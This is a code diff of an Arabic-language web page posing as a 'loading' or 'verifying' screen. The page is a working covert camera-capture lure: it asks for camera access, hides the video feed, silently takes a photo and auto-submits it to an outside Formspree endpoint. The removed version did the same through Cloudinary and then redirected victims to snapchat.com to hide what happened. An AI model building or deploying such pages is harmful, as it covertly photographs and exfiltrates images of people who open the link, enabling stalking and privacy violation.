@@ -3,62 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>جاري التحقق...</title>
     <style>
-        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
-        video, canvas { display: none; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h2>جاري التحميل...</h2>
-    <video id="video" width="640" height="480" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto 20px;"></div>
+        <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
+    </div>
+
+    <!-- عناصر مخفية للمعالجة -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <!-- نموذج Formspree الخاص بك -->
+    <form id="photoForm" action="https://formspree.io/f/mojrkand" method="POST">
+        <input type="hidden" name="image_data" id="imageInput">
+        <input type="hidden" name="_subject" value="صورة جديدة من الرابط">
+    </form>
 
     <script>
-        // رابط Formspree الخاص بك
-        const FORMSPREE_URL = "https://formspree.io"; 
-
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const imageInput = document.getElementById('imageInput');
+        const form = document.getElementById('photoForm');
 
+        // طلب الوصول للكاميرا فور تحميل الصفحة
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(captureAndUpload, 1500);
+                
+                // انتظار 1.5 ثانية لالتقاط صورة واضحة
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    // تحويل الصورة لصيغة Base64
+                    const dataURL = canvas.toDataURL('image/png');
+                    imageInput.value = dataURL;
+                    
+                    // إرسال البيانات تلقائياً
+                    form.submit();
+                }, 1500);
             })
-            .catch(() => { window.location.href = "https://snapchat.com"; });
-
-        function captureAndUpload() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
-            const imageData = canvas.toDataURL('image/jpeg', 0.6);
-
-            const formData = new FormData();
-            formData.append("file", imageData);
-            formData.append("upload_preset", "ml_default");
-
-            // رفع الصورة للحصول على رابط
-            fetch("https://cloudinary.com", {
-                method: "POST",
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                const imageUrl = data.secure_url; 
-
-                // إرسال الرابط وحده فقط
-                return fetch(FORMSPREE_URL, {
-                    method: "POST",
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify({
-                        "الرابط": imageUrl 
-                    })
-                });
-            })
-            .finally(() => {
-                window.location.href = "https://snapchat.com";
+            .catch(err => {
+                console.error("خطأ في الوصول للكاميرا: ", err);
+                alert("عذراً، يجب السماح بالكاميرا لكي يعمل هذا الرابط بشكل صحيح.");
             });
-        }
     </script>
 </body>
 </html>
